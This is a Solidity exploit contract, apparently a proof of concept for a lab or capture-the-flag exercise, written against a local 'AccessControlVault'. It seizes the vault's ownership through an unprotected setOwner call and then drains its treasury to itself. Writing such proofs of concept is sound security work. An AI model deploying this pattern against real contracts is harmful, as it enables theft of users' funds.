// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {AccessControlVault} from "../src/AccessControlVault.sol";

contract ExploitModule {
    AccessControlVault public targetContract;

    constructor(address _target) payable {
        targetContract = AccessControlVault(payable(_target));
    }

    function runExploit() external payable {
        // First, we steal the ownership of the vault
        targetContract.setOwner(address(this));

        // Then, we drain the treasury
        targetContract.withdrawTreasury(payable(address(this)));
    }

    receive() external payable {}
}